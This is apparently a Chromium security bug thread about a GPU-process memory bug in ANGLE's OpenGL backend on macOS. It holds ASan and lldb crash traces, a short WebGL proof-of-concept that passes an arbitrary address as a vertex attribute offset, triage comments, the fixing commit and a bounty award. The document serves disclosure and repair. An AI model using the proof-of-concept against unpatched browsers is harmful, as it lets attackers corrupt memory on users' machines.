#13 0x10f8134ec in content::BrowserMainLoop::CreateStartupTasks()+0x6cc (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd974ec) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#14 0x10f81b6d8 in content::BrowserMainRunnerImpl::Initialize(content::MainFunctionParams)+0x158 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd9f6d8) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#15 0x10f80fe58 in content::BrowserMain(content::MainFunctionParams)+0x174 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd93e58) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#16 0x111d4d3fc in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate\*)+0x210 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32d13fc) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#17 0x111d4fbdc in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0x378 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32d3bdc) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#18 0x111d4f578 in content::ContentMainRunnerImpl::Run()+0x5bc (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32d3578) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#19 0x111d4b4d4 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner\*)+0x9ec (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32cf4d4) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#20 0x111d4b9f0 in content::ContentMain(content::ContentMainParams)+0x144 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32cf9f0) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#21 0x11802e908 in ChromeMain+0x424 (/Users/nesk/chromium/src/out/AsanRelease/libchrome\_dll.dylib:arm64+0xa908) (BuildId: 4c4c44d955553144a14eb5b18d3feb4c32000000200000000100000000000b00)  

#22 0x102cdcbb4 in main+0x22c (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000bb4) (BuildId: 4c4c44a755553144a1708036cdec4a1432000000200000000100000000000b00)  

#23 0x1a7f0ff24 (<unknown module>)  

#24 0x75477ffffffffffc (<unknown module>)

ams)+0x174 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd93e58) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#16 0x111d4d3fc in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate\*)+0x210 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32d13fc) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#17 0x111d4fbdc in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0x378 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32d3bdc) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#18 0x111d4f578 in content::ContentMainRunnerImpl::Run()+0x5bc (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32d3578) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#19 0x111d4b4d4 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner\*)+0x9ec (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32cf4d4) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#20 0x111d4b9f0 in content::ContentMain(content::ContentMainParams)+0x144 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x32cf9f0) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#21 0x11802e908 in ChromeMain+0x424 (/Users/nesk/chromium/src/out/AsanRelease/libchrome\_dll.dylib:arm64+0xa908) (BuildId: 4c4c44d955553144a14eb5b18d3feb4c32000000200000000100000000000b00)  

#22 0x102cdcbb4 in main+0x22c (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000bb4) (BuildId: 4c4c44a755553144a1708036cdec4a1432000000200000000100000000000b00)  

#23 0x1a7f0ff24 (<unknown module>)  

#24 0x75477ffffffffffc (<unknown module>)

==7974==ADDITIONAL INFO

==7974==ADDITIONAL INFO

==7974==Note: Please include this section with the ASan report.

==7974==Note: Please include this section with the ASan report.  

Task trace:  

Task trace:  

#0 0x108cf2854 in gpu::SchedulerDfs::TryScheduleSequence(gpu::SchedulerDfs::Sequence\*)+0x544 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x76854) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#0 0x108cf2854 in gpu::SchedulerDfs::TryScheduleSequence(gpu::SchedulerDfs::Sequence\*)+0x544 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x76854) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#1 0x1042c5914 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int)+0x29c (/Users/nesk/chromium/src/out/AsanRelease/libmojo\_public\_system\_cpp.dylib:arm64+0x19914) (BuildId: 4c4c442155553144a1be8c5f8846060032000000200000000100000000000b00)  

#1 0x1042c5914 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int)+0x29c (/Users/nesk/chromium/src/out/AsanRelease/libmojo\_public\_system\_cpp.dylib:arm64+0x19914) (BuildId: 4c4c442155553144a1be8c5f8846060032000000200000000100000000000b00)  

#2 0x104651fe8 in mojo::(anonymous namespace)::ThreadSafeInterfaceEndpointClientProxy::SendMessage(mojo::Message&)+0x108 (/Users/nesk/chromium/src/out/AsanRelease/libmojo\_public\_cpp\_bindings.dylib:arm64+0x29fe8) (BuildId: 4c4c446355553144a174cd99a9e91f4e32000000200000000100000000000b00)  

#2 0x104651fe8 in mojo::(anonymous namespace)::ThreadSafeInterfaceEndpointClientProxy::SendMessage(mojo::Message&)+0x108 (/Users/nesk/chromium/src/out/AsanRelease/libmojo\_public\_cpp\_bindings.dylib:arm64+0x29fe8) (BuildId: 4c4c446355553144a174cd99a9e91f4e32000000200000000100000000000b00)  

#3 0x1060adf18 in IPC::(anonymous namespace)::ChannelAssociatedGroupController::Accept(mojo::Message\*)+0xaac (/Users/nesk/chromium/src/out/AsanRelease/libipc.dylib:arm64+0x35f18) (BuildId: 4c4c449355553144a1264d2beb88447332000000200000000100000000000b00)  

#3 0x1060adf18 in IPC::(anonymous namespace)::ChannelAssociatedGroupController::Accept(mojo::Message\*)+0xaac (/Users/nesk/chromium/src/out/AsanRelease/libipc.dylib:arm64+0x35f18) (BuildId: 4c4c449355553144a1264d2beb88447332000000200000000100000000000b00)

==7974==END OF ADDITIONAL INFO

==7974==END OF ADDITIONAL INFO

**REPRODUCTION CASE**  

I am trying to minimize testcase will upload it later.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: GPU Process  

Crash State: See asan.log

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 33.6 KB)
- [poc.html](attachments/poc.html) (text/plain, 1.6 KB)

## Timeline

### [Deleted User] (2023-06-20)

[Empty comment from Monorail migration]

### ne...@nesk.kr (2023-06-20)

VERSION
Chrome Version: [116.0.5840.0] + [Dev build & Asan]
Operating System: macOS Ventura 13.4 (Apple M2 Pro)

GPU INFO
GL_RENDERER : ANGLE (Apple, Apple M2 Pro, OpenGL 4.1 Metal - 83.1)
GL_VERSION : OpenGL ES 2.0.0 (ANGLE 2.1.21313 git hash: 24f4007b93e0)

Chromium Build Flags (args.gn)
```
is_debug=false
symbol_level=1
is_asan=true
is_component_build = true
dcheck_always_on = false
enable_nacl = false
is_ubsan=false
```

### ne...@nesk.kr (2023-06-20)

REPRODUCTION CASE
I've attached a minimized testcase. when testing in chrome, the following parameters are required. 
on Apple's M2, OpenGL appears to be the default renderer

```
./Chromium.app/Contents/MacOS/Chromium --no-sandbox --incognito --disable-in-process-stack-traces poc.html
```

### cl...@chromium.org (2023-06-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4519983382724608.

### ne...@nesk.kr (2023-06-22)


At first glance, this bug appears to have a similar impact as https://crbug.com/chromium/1285885, but it's unclear whether the root causes are the same.

```
var buffer = gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER, buffer);

gl.bindAttribLocation(program, 0.0, "texCoord0");
gl.enableVertexAttribArray(0);

var uloc = gl.getUniformLocation(program, "vPosition");
gl.vertexAttribDivisor(uloc, gl.SYNC_FLAGS);
//gl.linkProgram(program);

var rloc = gl.getAttribLocation(program, "texCoord0");
gl.vertexAttribPointer(rloc, 1<<0, gl.UNSIGNED_BYTE, false, 9, 0x41424344);
gl.drawArrays(gl.TRIANGLES, 0, 6);
```

I've found that in the PoC code, if the linkProgram function is commented out, drawArrays prints the following error:

```
WebGL: INVALID_OPERATION: drawArrays: no buffer is bound to enabled attribute
```

So it seems that glDrawArrays doesn't check whether a buffer is bound to the enabled attribute after linkProgram is called


The impact of this bug is similar to that of https://crbug.com/chromium/1285885. The last argument of glVertexAttribPointer can be used as a pointer to arbitrary memory, even though it should be used as an offset in WebGL

The actual crash occurs within the OpenGL library on macOS, as follows:

```
Process 13305 stopped
* thread #25, name = 'Chrome_InProcGpuThread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41424344)
    frame #0: 0x00000001eb42dc2c GLEngine`gleRunVertexSubmitImmediate + 2888
GLEngine`gleRunVertexSubmitImmediate:
->  0x1eb42dc2c <+2888>: ldrb   w9, [x9]
    0x1eb42dc30 <+2892>: b      0x1eb42dc38               ; <+2900>
    0x1eb42dc34 <+2896>: ldrh   w9, [x9]
    0x1eb42dc38 <+2900>: str    x9, [sp, #0x80]
Target 0: (Chromium) stopped.

(lldb) register read x9
      x9 = 0x0000000041424344

(lldb) bt
* thread #25, name = 'Chrome_InProcGpuThread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41424344)
  * frame #0: 0x00000001eb42dc2c GLEngine`gleRunVertexSubmitImmediate + 2888
    frame #1: 0x00000001eb3bcb8c GLEngine`glDrawArrays_ACC_GL3Exec + 696
    frame #2: 0x000000014a27df40 libGLESv2.dylib`rx::ContextGL::drawArrays(this=0x0000600001865280, context=0x0000000128a6cc00, mode=Triangles, first=0, count=6) at ContextGL.cpp:330:9 [opt]
    frame #3: 0x0000000149ed6bb4 libGLESv2.dylib`::GL_DrawArrays(GLenum, GLint, GLsizei) at Context.inl.h:146:5 [opt]
    frame #4: 0x0000000149ed6a1c libGLESv2.dylib`::GL_DrawArrays(mode=<unavailable>, first=0, count=6) at entry_points_gles_2_0_autogen.cpp:1186:22 [opt]
    frame #5: 0x00000001177b00ec libgpu_gles2.dylib`gpu::gles2::GLES2DecoderPassthroughImpl::DoDrawArrays(this=<unavailable>, mode=<unavailable>, first=<unavailable>, count=<unavailable>) at gles2_cmd_decoder_passthrough_doers.cc:1207:10 [opt]
    frame #6: 0x000000011779eb8c libgpu_gles2.dylib`gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(this=0x0000000128aa9e00, num_commands=<unavailable>, buffer=<unavailable>, num_entries=70, entries_processed=0x000000017a0c8e40) at gles2_cmd_decoder_passthrough.cc:735:20 [opt]
```

### xi...@chromium.org (2023-06-22)

Thanks for sharing more info. Fuzzer is not working so I'm triaging manually. +romanl@, could you take a look since it is similar to https://crbug.com/1285885?

Reporter, could you check if the crash can be reproduced on M114? Setting the FoundIn label to 116 for now. Pending adjustment.

[Monorail components: Internals>GPU>ANGLE]

### [Deleted User] (2023-06-22)

[Empty comment from Monorail migration]

### ad...@google.com (2023-06-22)

(I am a bot: this is an auto-cc on a security bug)

### ro...@google.com (2023-06-22)

https://crbug.com/1285885 was specific to Vulkan (VertexArrayVk::updateStreamedAttribs), this is opengl (and MacOS? and passthrough?)

### ro...@google.com (2023-06-22)

[Empty comment from Monorail migration]

### ne...@nesk.kr (2023-06-23)

Ok, the issue is also able to be reproduced on version 114.0.5735.133 (stable)

```
(lldb) r --single-process --no-sandbox ~/poc.html 
There is a running process, kill it and restart?: [Y/n] y
Process 1016 exited with status = 9 (0x00000009) 
Process 5336 launched: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' (arm64)
[5336:259:0624/003337.751188:ERROR:system_network_context_manager.cc(776)] Cannot use V8 Proxy resolver in single process mode.
2023-06-24 00:33:48.052166+0900 Google Chrome[5336:149941] [API] cannot add handler to 4 from 1 - dropping
2023-06-24 00:33:48.052488+0900 Google Chrome[5336:149941] [API] cannot add handler to 3 from 1 - dropping
2023-06-24 00:33:48.182150+0900 Google Chrome[5336:149941] [API] cannot add handler to 2 from 2 - dropping
2023-06-24 00:33:48.184422+0900 Google Chrome[5336:149941] [API] cannot add handler to 4 from 4 - dropping
Process 5336 stopped
* thread #22, name = 'Chrome_InProcGpuThread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41424344)
    frame #0: 0x0000000211345c2c GLEngine`gleRunVertexSubmitImmediate + 2888
GLEngine`gleRunVertexSubmitImmediate:
->  0x211345c2c <+2888>: ldrb   w9, [x9]
    0x211345c30 <+2892>: b      0x211345c38               ; <+2900>
    0x211345c34 <+2896>: ldrh   w9, [x9]
    0x211345c38 <+2900>: str    x9, [sp, #0x80]
Target 0: (Google Chrome) stopped.

(lldb) bt
* thread #22, name = 'Chrome_InProcGpuThread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41424344)
  * frame #0: 0x0000000211345c2c GLEngine`gleRunVertexSubmitImmediate + 2888
    frame #1: 0x00000002112d4b8c GLEngine`glDrawArrays_ACC_GL3Exec + 696
    frame #2: 0x0000000107b106c0 libGLESv2.dylib`ANGLEResetDisplayPlatform + 842568
    frame #3: 0x00000001078d7cd0 libGLESv2.dylib`GL_DrawArrays + 608
```

### [Deleted User] (2023-06-23)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-06-23)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ah...@google.com (2023-06-23)

Adjusting FoundIn to 114 as discussed offline with xinghuilu@

### [Deleted User] (2023-06-23)

[Comment Deleted]

### am...@chromium.org (2023-06-26)

[secondary security shepherd] Looks like the original owner has removed themselves, presuming since they are on the Android GPU team and this is an ANGLE issue that may be specific to Mac. 
Assigning to geofflang@ to get this in the triage queue for ANGLE team, cc'ing others for awareness 

### kb...@chromium.org (2023-06-26)

geofflang@ is out right now. Shabi, do you know these validation paths on other ANGLE backends well enough to know whether the fix from https://crbug.com/chromium/1285885 is applicable to the OpenGL backend too? It looks like instancing is being turned on in this POC too.


[Monorail components: Blink>WebGL]

### sy...@chromium.org (2023-06-27)

Geoff has a patch: https://chromium-review.googlesource.com/c/angle/angle/+/4642048

It probably needs some test suppressions before it can land.

### [Deleted User] (2023-07-04)

geofflang: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-07-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/4e6124dae892690204f8e5996aeaad14f45e0a97

commit 4e6124dae892690204f8e5996aeaad14f45e0a97
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/util/autogen/angle_features_autogen.h
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/include/platform/autogen/FeaturesGL_autogen.h
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/util/autogen/angle_features_autogen.cpp
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/4e6124dae892690204f8e5996aeaad14f45e0a97/include/platform/gl_features.json


### gi...@appspot.gserviceaccount.com (2023-07-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2dd54679e9cb59cdae69ec16d6be89e0a27b5c0c

commit 2dd54679e9cb59cdae69ec16d6be89e0a27b5c0c
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Jul 13 17:16:23 2023

Roll ANGLE from f065346170a8 to 1d496191ad91 (24 revisions)

https://chromium.googlesource.com/angle/angle.git/+log/f065346170a8..1d496191ad91

2023-07-13 geofflang@chromium.org Revert "Terminate the display if initialization fails."
2023-07-13 syoussefi@chromium.org Remove stale autogen files
2023-07-13 syoussefi@chromium.org Remove redundant mip-level-size validation
2023-07-13 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 4ba3255697ef to ad8a66bf7d69 (8 revisions)
2023-07-13 angle-autoroll@skia-public.iam.gserviceaccount.com Roll SwiftShader from dda70a3ef9fe to 151fa797ee3e (1 revision)
2023-07-13 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from 3d5d845687d5 to de1153f640b8 (604 revisions)
2023-07-13 syoussefi@chromium.org Make context-loss state atomic
2023-07-12 cclao@google.com Vulkan: Dont break RP if there is actual render feedback loop
2023-07-12 cclao@google.com Vulkan: Avoid flushCommandsAndEndRenderPass for readonlyDS switch
2023-07-12 syoussefi@chromium.org Pass only context-private state to private entry points
2023-07-12 syoussefi@chromium.org Split the context-private part of the state cache
2023-07-12 syoussefi@chromium.org Rename context-local to context-private state
2023-07-12 cnorthrop@google.com Revert "Stop rolling third_party/cpu_features"
2023-07-12 angle-autoroll@skia-public.iam.gserviceaccount.com Roll SwiftShader from 3e73cce1c470 to dda70a3ef9fe (1 revision)
2023-07-12 phanquangminh217@gmail.com Vulkan: Enable timeline semaphores if supported by device
2023-07-12 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 03c816988bfd to 4ba3255697ef (11 revisions)
2023-07-12 lexa.knyazev@gmail.com Add GL_EXT_texture_compression_astc_decode_mode stubs
2023-07-12 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from d0f9360d7ae6 to 3d5d845687d5 (622 revisions)
2023-07-11 geofflang@chromium.org Terminate the display if initialization fails.
2023-07-11 yuxinhu@google.com Enable the new deqp khr test suites on Bot
2023-07-11 oliver.wolff@qt.io winrt: Fix initialization of zero-sized window
2023-07-11 syoussefi@chromium.org Translator: Reorganize files
2023-07-11 geofflang@chromium.org GL: Ensure all instanced attributes have a buffer with data
2023-07-11 oliver.wolff@qt.io D3D11: Fix Windows Store D3D Trim and Level 9 requirements

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/angle-chromium-autoroll
Please CC angle-team@google.com,cnorthrop@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
Bug: chromium:1322521,chromium:1456243
Tbr: cnorthrop@google.com
Test: Test: scripts/roll_aosp.sh
Change-Id: I3116fb899a8f2551423348fb82abeff83d9bb552
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4683758
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1170012}

[modify] https://crrev.com/2dd54679e9cb59cdae69ec16d6be89e0a27b5c0c/DEPS


### yn...@chromium.org (2023-07-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-18)

geofflang: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ge...@chromium.org (2023-07-18)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-19)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-19)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-19)

Requesting merge to extended stable M114 because latest trunk commit (1170012) appears to be after extended stable branch point (1135570).

Requesting merge to stable M115 because latest trunk commit (1170012) appears to be after stable branch point (1148114).

Requesting merge to dev M116 because latest trunk commit (1170012) appears to be after dev branch point (1160321).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [114, 115, 116].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-20)

Requesting merge to extended stable M114 because latest trunk commit (1170012) appears to be after extended stable branch point (1135570).

Requesting merge to stable M115 because latest trunk commit (1170012) appears to be after stable branch point (1148114).

Requesting merge to beta M116 because latest trunk commit (1170012) appears to be after beta branch point (1160321).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [114, 115, 116].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-21)

Requesting merge to extended stable M114 because latest trunk commit (1170012) appears to be after extended stable branch point (1135570).

Requesting merge to stable M115 because latest trunk commit (1170012) appears to be after stable branch point (1148114).

Requesting merge to beta M116 because latest trunk commit (1170012) appears to be after beta branch point (1160321).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [114, 115, 116].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-22)

Requesting merge to extended stable M114 because latest trunk commit (1170012) appears to be after extended stable branch point (1135570).

Requesting merge to stable M115 because latest trunk commit (1170012) appears to be after stable branch point (1148114).

Requesting merge to beta M116 because latest trunk commit (1170012) appears to be after beta branch point (1160321).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [114, 115, 116].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-23)

Requesting merge to extended stable M114 because latest trunk commit (1170012) appears to be after extended stable branch point (1135570).

Requesting merge to stable M115 because latest trunk commit (1170012) appears to be after stable branch point (1148114).

Requesting merge to beta M116 because latest trunk commit (1170012) appears to be after beta branch point (1160321).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [114, 115, 116].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-07-24)

merges for https://chromium-review.googlesource.com/c/angle/angle/+/4642048 approved
please merge this fix to branch 5484 (M116/beta), branch 5790 (M115/Stable), and branch 5735 (M114/Extended) at soonest / by EOD tomorrow (Tuesday, 25 July) so this fix can be included in the next M116 beta update on Wednesday and the next M115/Stable and M114/Extended Stable updates being cut on Friday. Thank you! 

### am...@google.com (2023-07-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-07-27)

Congratulations n3sk! The VRP Panel has decided to award you $10,000 for this report. Thank you for your efforts and reporting this issue to us -- nice work! 

### gi...@appspot.gserviceaccount.com (2023-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/cafe56b591edb77f041be70b58cac3a61565644a

commit cafe56b591edb77f041be70b58cac3a61565644a
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

M116: GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
